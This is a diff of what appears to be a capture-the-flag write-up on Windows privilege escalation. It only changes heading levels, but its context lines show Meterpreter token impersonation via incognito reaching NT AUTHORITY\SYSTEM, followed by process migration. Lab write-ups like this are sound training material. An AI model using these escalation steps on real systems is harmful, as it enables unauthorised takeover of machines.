@@ -213,7 +213,7 @@ SeCreateGlobalPrivilege         Create global objects                     Enable
 
 It appears the current user has the SeImpersonate privilege.
 
-### Impersonation
+## Impersonation
 
 Load [incognito](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/), which allows for impersonating tokens:
 
@@ -242,7 +242,7 @@ Impersonate:
     meterpreter > getuid
     Server username: NT AUTHORITY\SYSTEM
 
-### Migration
+## Migration
 
 ```text
 meterpreter > ps
@@ -263,7 +263,7 @@ Migrate:
     [*] Migrating from 2960 to 668...
     [*] Migration completed successfully.
 
-### Flag
+## Flag
 
 Get the flag:
 
